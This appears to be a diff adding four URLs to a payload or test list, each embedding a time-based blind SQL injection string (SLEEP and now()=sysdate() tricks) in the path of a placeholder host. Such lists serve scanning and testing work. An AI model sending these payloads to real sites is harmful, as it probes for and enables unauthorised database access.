@@ -1,0 +1,4 @@
+https://redact.com/page/if(now()=sysdate(),sleep(3),0)/"XOR(if(now()=sysdate(),sleep(3),0))OR"/
+https://redact.com/(select(0)from(select(sleep(5)))v)%2f'+(select(0)from(select(sleep(5)))v)+'"
+https://redact.com/page/1 AnD SLEEP(5)
+https://redact.com/page/1' ORDER BY SLEEP(5)
